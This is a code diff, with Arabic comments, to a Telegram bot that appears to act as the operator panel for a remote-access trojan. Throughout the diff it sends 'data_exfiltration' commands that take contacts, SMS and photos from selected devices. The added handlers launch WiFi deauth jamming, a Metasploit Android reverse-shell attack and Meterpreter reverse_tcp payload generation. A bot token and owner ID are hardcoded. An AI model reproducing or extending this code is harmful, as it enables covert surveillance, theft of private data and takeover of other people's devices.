@@ -81,6 +81,27 @@ BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', "7305811865:AAF_PKkBWEUw-QdL1ee
 OWNER_USER_ID = int(os.environ.get('OWNER_USER_ID', 985612253))
 bot = telebot.TeleBot(BOT_TOKEN)
 DB_FILE = 'devices.db'
+
+# تهيئة مدير الأجهزة
+device_manager = DeviceManager(DB_FILE)
+
+# تهيئة منفذ الأوامر مع الربط الحقيقي
+command_executor = CommandExecutor(COMMAND_SERVER_URL)
+
+# تهيئة منفذ الأوامر المتقدمة
+advanced_command_executor = AdvancedCommandExecutor(COMMAND_SERVER_URL)
+
+# تهيئة مدير الأمان
+security_manager = SecurityManager()
+
+# تهيئة محلل الأوامر المتقدمة
+command_parser = AdvancedCommandParser()
+
+# إعداد المستخدمين المصرح لهم
+setup_authorized_users()
+
+# تشغيل المجدول
+run_scheduler()
 # تحديد رابط خادم الأوامر بناءً على البيئة
 def get_command_server_url():
     """تحديد رابط خادم الأوامر بناءً على البيئة"""
@@ -91,10 +112,10 @@ def get_command_server_url():
     
     # التحقق من البيئة المحلية
     if os.environ.get('NODE_ENV') == 'development' or os.environ.get('LOCAL_DEVELOPMENT'):
-        return 'http://localhost:10001'
+        return 'http://localhost:8080'  # منفذ خادم الأوامر الحقيقي
     
     # الرابط الافتراضي للإنتاج
-    return 'https://remote-control-command-server.onrender.com'
+    return 'http://localhost:8080'  # استخدام المنفذ المحلي
 
 COMMAND_SERVER_URL = get_command_server_url()
 
@@ -376,13 +397,25 @@ class CommandExecutor:
         self.reconnect_interval = 5000
 
     def check_connection(self) -> bool:
-        """فحص الاتصال بالخادم"""
+        """فحص الاتصال بالخادم الحقيقي"""
         try:
-            response = requests.get(f'{self.server_url}/stats', timeout=5)
+            response = requests.get(f'{self.server_url}/status', timeout=5)
             self.is_connected = response.status_code == 200
+            if self.is_connected:
+                logger.info("✅ الاتصال بالخادم نشط")
+            else:
+                logger.warning("⚠️ الخادم متصل ولكن غير مستجيب")
             return self.is_connected
+        except requests.exceptions.ConnectionError:
+            logger.error("❌ لا يمكن الاتصال بالخادم")
+            self.is_connected = False
+            return False
+        except requests.exceptions.Timeout:
+            logger.error("⏰ انتهت مهلة الاتصال بالخادم")
+            self.is_connected = False
+            return False
         except Exception as e:
-            logger.error(f"خطأ في فحص الاتصال: {e}")
+            logger.error(f"❌ خطأ في فحص الاتصال: {e}")
             self.is_connected = False
             return False
 
@@ -393,7 +426,7 @@ class CommandExecutor:
         return base64.b64encode(data.encode()).decode()
 
     def send_command(self, device_id: str, command: str, parameters: dict = None) -> dict:
-        """إرسال أمر للجهاز"""
+        """إرسال أمر للجهاز عبر خادم الأوامر الحقيقي"""
         try:
             # فحص الاتصال أولاً
             if not self.check_connection():
@@ -401,80 +434,96 @@ class CommandExecutor:
                 self.save_pending_command(device_id, command, parameters)
                 return {'status': 'pending', 'message': 'الخادم غير متصل، سيتم تنفيذ الأمر عند الاتصال'}
 
-            # الحصول على مفتاح التشفير للجهاز
-            encryption_key = device_manager.get_device_encryption_key(device_id)
-            
-            # تشفير المعلمات إذا كان التشفير مفعلاً
-            encrypted_params = None
-            if SECURITY_CONFIG['enable_encryption'] and encryption_key:
-                params_str = json.dumps(parameters) if parameters else '{}'
-                encrypted_params = self.encrypt_data(params_str, encryption_key)
-            else:
-                encrypted_params = parameters
-
+            # إعداد البيانات للإرسال
             payload = {
-                'deviceId': device_id,
+                'client_id': device_id,
                 'command': command,
-                'parameters': encrypted_params or {}
+                'parameters': parameters or {},
+                'timestamp': time.time(),
+                'user_id': 'telegram_bot'
             }
 
+            # إرسال الأمر للخادم
             response = requests.post(
-                f'{self.server_url}/send-command',
+                f'{self.server_url}/command',
                 json=payload,
+                headers={'Content-Type': 'application/json'},
                 timeout=SECURITY_CONFIG['command_timeout']
             )
 
             if response.status_code == 200:
-                return response.json()
+                result = response.json()
+                logger.info(f"تم إرسال الأمر بنجاح: {command} للجهاز {device_id}")
+                return result
             else:
                 # حفظ الأمر محلياً في حالة الفشل
                 self.save_pending_command(device_id, command, parameters)
+                logger.error(f"خطأ في الخادم: {response.status_code} - {response.text}")
                 return {'error': f'خطأ في الخادم: {response.status_code}'}
 
         except requests.exceptions.Timeout:
             self.save_pending_command(device_id, command, parameters)
+            logger.error(f"انتهت مهلة الاتصال للجهاز {device_id}")
             return {'error': 'انتهت مهلة الاتصال'}
         except requests.exceptions.RequestException as e:
             self.save_pending_command(device_id, command, parameters)
+            logger.error(f"خطأ في الاتصال: {str(e)}")
             return {'error': f'خطأ في الاتصال: {str(e)}'}
+        except Exception as e:
+            logger.error(f"خطأ غير متوقع: {str(e)}")
+            return {'error': f'خطأ غير متوقع: {str(e)}'}
 
     def get_device_status(self, device_id: str) -> dict:
-        """الحصول على حالة الجهاز"""
+        """الحصول على حالة الجهاز من الخادم الحقيقي"""
         try:
             if not self.check_connection():
                 return {'error': 'الخادم غير متصل'}
 
             response = requests.get(
-                f'{self.server_url}/device-status/{device_id}',
+                f'{self.server_url}/client-status/{device_id}',
                 timeout=10
             )
 
             if response.status_code == 200:
-                return response.json()
+                result = response.json()
+                logger.info(f"تم جلب حالة الجهاز: {device_id}")
+                return result
             else:
+                logger.error(f"خطأ في جلب حالة الجهاز: {response.status_code}")
                 return {'error': f'خطأ في الخادم: {response.status_code}'}
 
         except requests.exceptions.RequestException as e:
+            logger.error(f"خطأ في الاتصال لجلب حالة الجهاز: {str(e)}")
             return {'error': f'خطأ في الاتصال: {str(e)}'}
+        except Exception as e:
+            logger.error(f"خطأ غير متوقع في جلب حالة الجهاز: {str(e)}")
+            return {'error': f'خطأ غير متوقع: {str(e)}'}
 
     def get_connected_devices(self) -> dict:
-        """الحصول على قائمة الأجهزة المتصلة"""
+        """الحصول على قائمة الأجهزة المتصلة من الخادم الحقيقي"""
         try:
             if not self.check_connection():
                 return {'error': 'الخادم غير متصل'}
 
             response = requests.get(
-                f'{self.server_url}/devices',
+                f'{self.server_url}/clients',
                 timeout=10
             )
 
             if response.status_code == 200:
-                return response.json()
+                result = response.json()
+                logger.info(f"تم جلب {len(result.get('clients', []))} جهاز متصل")
+                return result
             else:
+                logger.error(f"خطأ في جلب الأجهزة المتصلة: {response.status_code}")
                 return {'error': f'خطأ في الخادم: {response.status_code}'}
 
         except requests.exceptions.RequestException as e:
+            logger.error(f"خطأ في الاتصال لجلب الأجهزة: {str(e)}")
             return {'error': f'خطأ في الاتصال: {str(e)}'}
+        except Exception as e:
+            logger.error(f"خطأ غير متوقع في جلب الأجهزة: {str(e)}")
+            return {'error': f'خطأ غير متوقع: {str(e)}'}
 
     def save_pending_command(self, device_id: str, command: str, parameters: dict = None):
         """حفظ الأمر محلياً للتنفيذ لاحقاً"""
@@ -4673,18 +4722,27 @@ def select_device_interactive(message, device_id):
     bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
 
 def handle_contacts_callback(call):
-    """معالجة أوامر جهات الاتصال"""
+    """معالجة أوامر جهات الاتصال مع الربط الحقيقي"""
     data = call.data
     
     if data == "contacts_backup_all":
         # تنفيذ نسخ جميع جهات الاتصال
         device_id = get_selected_device(call.from_user.id)
         if device_id:
-            result = command_executor.send_command(device_id, "backup_contacts", {"all": True})
-            if result.get('success'):
+            # إرسال الأمر الحقيقي للخادم
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "contacts",
+                "action": "backup_all",
+                "format": "json"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
                 bot.answer_callback_query(call.id, "✅ تم نسخ جميع جهات الاتصال")
+                logger.info(f"تم نسخ جهات الاتصال للجهاز {device_id}")
             else:
-                bot.answer_callback_query(call.id, "❌ فشل في نسخ جهات الاتصال")
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في نسخ جهات الاتصال: {error_msg}")
+                logger.error(f"فشل في نسخ جهات الاتصال للجهاز {device_id}: {error_msg}")
         else:
             bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
     
@@ -4696,8 +4754,13 @@ def handle_contacts_callback(call):
         # إحصائيات جهات الاتصال
         device_id = get_selected_device(call.from_user.id)
         if device_id:
-            result = command_executor.send_command(device_id, "contacts_stats", {})
-            if result.get('success'):
+            # إرسال أمر الحصول على الإحصائيات
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "contacts",
+                "action": "get_stats"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
                 stats = result.get('data', {})
                 text = f"""
 📊 **إحصائيات جهات الاتصال**
@@ -4708,24 +4771,36 @@ def handle_contacts_callback(call):
 📅 **آخر تحديث:** {stats.get('last_update', 'غير متوفر')}
                 """
                 bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+                logger.info(f"تم جلب إحصائيات جهات الاتصال للجهاز {device_id}")
             else:
-                bot.answer_callback_query(call.id, "❌ فشل في جلب الإحصائيات")
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في جلب الإحصائيات: {error_msg}")
+                logger.error(f"فشل في جلب إحصائيات جهات الاتصال للجهاز {device_id}: {error_msg}")
         else:
             bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
 
 def handle_sms_callback(call):
-    """معالجة أوامر الرسائل"""
+    """معالجة أوامر الرسائل مع الربط الحقيقي"""
     data = call.data
     
     if data == "sms_backup_all":
         # نسخ جميع الرسائل
         device_id = get_selected_device(call.from_user.id)
         if device_id:
-            result = command_executor.send_command(device_id, "backup_sms", {"all": True})
-            if result.get('success'):
+            # إرسال الأمر الحقيقي للخادم
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "sms",
+                "action": "backup_all",
+                "format": "json"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
                 bot.answer_callback_query(call.id, "✅ تم نسخ جميع الرسائل")
+                logger.info(f"تم نسخ الرسائل للجهاز {device_id}")
             else:
-                bot.answer_callback_query(call.id, "❌ فشل في نسخ الرسائل")
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في نسخ الرسائل: {error_msg}")
+                logger.error(f"فشل في نسخ الرسائل للجهاز {device_id}: {error_msg}")
         else:
             bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
     
@@ -4733,11 +4808,19 @@ def handle_sms_callback(call):
         # الرسائل الواردة
         device_id = get_selected_device(call.from_user.id)
         if device_id:
-            result = command_executor.send_command(device_id, "backup_sms", {"type": "inbox"})
-            if result.get('success'):
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "sms",
+                "action": "backup_inbox",
+                "format": "json"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
                 bot.answer_callback_query(call.id, "✅ تم جلب الرسائل الواردة")
+                logger.info(f"تم جلب الرسائل الواردة للجهاز {device_id}")
             else:
-                bot.answer_callback_query(call.id, "❌ فشل في جلب الرسائل الواردة")
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في جلب الرسائل الواردة: {error_msg}")
+                logger.error(f"فشل في جلب الرسائل الواردة للجهاز {device_id}: {error_msg}")
         else:
             bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
     
@@ -4745,27 +4828,44 @@ def handle_sms_callback(call):
         # الرسائل الصادرة
         device_id = get_selected_device(call.from_user.id)
         if device_id:
-            result = command_executor.send_command(device_id, "backup_sms", {"type": "sent"})
-            if result.get('success'):
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "sms",
+                "action": "backup_sent",
+                "format": "json"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
                 bot.answer_callback_query(call.id, "✅ تم جلب الرسائل الصادرة")
+                logger.info(f"تم جلب الرسائل الصادرة للجهاز {device_id}")
             else:
-                bot.answer_callback_query(call.id, "❌ فشل في جلب الرسائل الصادرة")
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في جلب الرسائل الصادرة: {error_msg}")
+                logger.error(f"فشل في جلب الرسائل الصادرة للجهاز {device_id}: {error_msg}")
         else:
             bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
 
 def handle_media_callback(call):
-    """معالجة أوامر الوسائط"""
+    """معالجة أوامر الوسائط مع الربط الحقيقي"""
     data = call.data
     
     if data == "media_photos":
         # نسخ الصور
         device_id = get_selected_device(call.from_user.id)
         if device_id:
-            result = command_executor.send_command(device_id, "backup_media", {"type": "photos"})
-            if result.get('success'):
+            # إرسال الأمر الحقيقي للخادم
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "media",
+                "action": "backup_photos",
+                "format": "binary"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
                 bot.answer_callback_query(call.id, "✅ تم نسخ الصور")
+                logger.info(f"تم نسخ الصور للجهاز {device_id}")
             else:
-                bot.answer_callback_query(call.id, "❌ فشل في نسخ الصور")
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في نسخ الصور: {error_msg}")
+                logger.error(f"فشل في نسخ الصور للجهاز {device_id}: {error_msg}")
         else:
             bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
     
@@ -4773,16 +4873,24 @@ def handle_media_callback(call):
         # نسخ الفيديوهات
         device_id = get_selected_device(call.from_user.id)
         if device_id:
-            result = command_executor.send_command(device_id, "backup_media", {"type": "videos"})
-            if result.get('success'):
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "media",
+                "action": "backup_videos",
+                "format": "binary"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
                 bot.answer_callback_query(call.id, "✅ تم نسخ الفيديوهات")
+                logger.info(f"تم نسخ الفيديوهات للجهاز {device_id}")
             else:
-                bot.answer_callback_query(call.id, "❌ فشل في نسخ الفيديوهات")
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في نسخ الفيديوهات: {error_msg}")
+                logger.error(f"فشل في نسخ الفيديوهات للجهاز {device_id}: {error_msg}")
         else:
             bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
 
 def handle_attack_callback(call):
-    """معالجة أوامر الهجمات"""
+    """معالجة أوامر الهجمات مع الربط الحقيقي"""
     data = call.data
     
     if data == "attack_wifi":
@@ -4820,6 +4928,46 @@ def handle_attack_callback(call):
         """
         
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
+    
+    elif data == "wifi_deauth":
+        # تنفيذ هجوم Deauth
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "wifi_jamming", {
+                "attack_type": "deauth",
+                "target_ssid": "all",
+                "duration": 60
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم بدء هجوم Deauth")
+                logger.info(f"تم بدء هجوم Deauth للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في بدء هجوم Deauth: {error_msg}")
+                logger.error(f"فشل في بدء هجوم Deauth للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "mobile_metasploit":
+        # تنفيذ هجوم Metasploit
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "mobile_attack", {
+                "attack_type": "metasploit",
+                "target_os": "android",
+                "payload_type": "reverse_shell"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم بدء هجوم Metasploit")
+                logger.info(f"تم بدء هجوم Metasploit للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في بدء هجوم Metasploit: {error_msg}")
+                logger.error(f"فشل في بدء هجوم Metasploit للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
 
 def handle_injection_callback(call):
     """معالجة أوامر الحقن"""
@@ -4859,15 +5007,20 @@ def handle_bypass_callback(call):
             bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
 
 def handle_system_callback(call):
-    """معالجة أوامر النظام"""
+    """معالجة أوامر النظام مع الربط الحقيقي"""
     data = call.data
     
     if data == "system_info":
         # معلومات النظام
         device_id = get_selected_device(call.from_user.id)
         if device_id:
-            result = command_executor.send_command(device_id, "system_info", {})
-            if result.get('success'):
+            # إرسال أمر الحصول على معلومات النظام
+            result = command_executor.send_command(device_id, "system_control", {
+                "action": "get_info",
+                "include": ["os", "hardware", "network", "battery", "memory"]
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
                 info = result.get('data', {})
                 text = f"""
 ⚙️ **معلومات النظام**
@@ -4877,15 +5030,38 @@ def handle_system_callback(call):
 🔋 **البطارية:** {info.get('battery', 'غير متوفر')}%
 💾 **الذاكرة:** {info.get('memory', 'غير متوفر')}
 🌐 **الشبكة:** {info.get('network', 'غير متوفر')}
+⏰ **وقت التشغيل:** {info.get('uptime', 'غير متوفر')}
                 """
                 bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+                logger.info(f"تم جلب معلومات النظام للجهاز {device_id}")
             else:
-                bot.answer_callback_query(call.id, "❌ فشل في جلب معلومات النظام")
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في جلب معلومات النظام: {error_msg}")
+                logger.error(f"فشل في جلب معلومات النظام للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "system_restart":
+        # إعادة تشغيل النظام
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "system_control", {
+                "action": "restart",
+                "force": True
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم إعادة تشغيل النظام")
+                logger.info(f"تم إعادة تشغيل النظام للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في إعادة تشغيل النظام: {error_msg}")
+                logger.error(f"فشل في إعادة تشغيل النظام للجهاز {device_id}: {error_msg}")
         else:
             bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
 
 def handle_tool_callback(call):
-    """معالجة أوامر الأدوات"""
+    """معالجة أوامر الأدوات مع الربط الحقيقي"""
     data = call.data
     
     if data == "tool_metasploit":
@@ -4905,6 +5081,56 @@ def handle_tool_callback(call):
         """
         
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
+    
+    elif data == "metasploit_start":
+        # تشغيل Metasploit
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "tool_execution", {
+                "tool": "metasploit",
+                "action": "start",
+                "console": True
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم تشغيل Metasploit")
+                logger.info(f"تم تشغيل Metasploit للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في تشغيل Metasploit: {error_msg}")
+                logger.error(f"فشل في تشغيل Metasploit للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "metasploit_payload":
+        # إنشاء Payload
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "tool_execution", {
+                "tool": "metasploit",
+                "action": "generate_payload",
+                "payload_type": "windows/meterpreter/reverse_tcp",
+                "lhost": "192.168.1.100",
+                "lport": 4444
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                payload_info = result.get('data', {})
+                text = f"""
+💉 **تم إنشاء Payload بنجاح**
+
+📁 **الملف:** {payload_info.get('file', 'غير متوفر')}
+📏 **الحجم:** {payload_info.get('size', 'غير متوفر')}
+🔗 **الرابط:** {payload_info.get('url', 'غير متوفر')}
+                """
+                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+                logger.info(f"تم إنشاء Payload للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في إنشاء Payload: {error_msg}")
+                logger.error(f"فشل في إنشاء Payload للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
 
 def handle_stats_callback(call):
     """معالجة أوامر الإحصائيات"""
